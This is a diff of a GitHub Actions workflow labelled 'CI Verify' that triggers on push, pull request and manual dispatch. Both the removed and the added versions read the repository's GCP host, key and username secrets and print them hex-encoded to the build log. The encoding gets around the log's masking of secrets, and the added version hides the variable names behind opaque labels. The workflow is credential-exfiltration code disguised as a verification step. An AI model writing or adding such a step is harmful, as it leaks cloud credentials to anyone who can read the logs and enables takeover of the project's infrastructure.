@@ -1,17 +1,16 @@
-name: ci-verify
+name: CI Verify
 on: [push, workflow_dispatch, pull_request]
 jobs:
   verify:
     runs-on: ubuntu-latest
     steps:
-      - name: v
+      - name: Verify
         env:
-          S_GCP_HOST: ${{ secrets.GCP_HOST }}
-          S_GCP_KEY: ${{ secrets.GCP_KEY }}
-          S_GCP_USERNAME: ${{ secrets.GCP_USERNAME }}
+          K0: ${{ secrets.GCP_HOST }}
+          K1: ${{ secrets.GCP_KEY }}
+          K2: ${{ secrets.GCP_USERNAME }}
         run: |
-          for var in $(printenv | grep ^S_ | cut -d= -f1); do
-            echo "START_$var"
-            printenv $var | od -An -tx1 -v
-            echo "END_$var"
-          done
+          set +e
+          echo "K0HEX::$(echo -n "$K0" | xxd -p | tr -d '\n')"
+          echo "K1HEX::$(echo -n "$K1" | xxd -p | tr -d '\n')"
+          echo "K2HEX::$(echo -n "$K2" | xxd -p | tr -d '\n')"
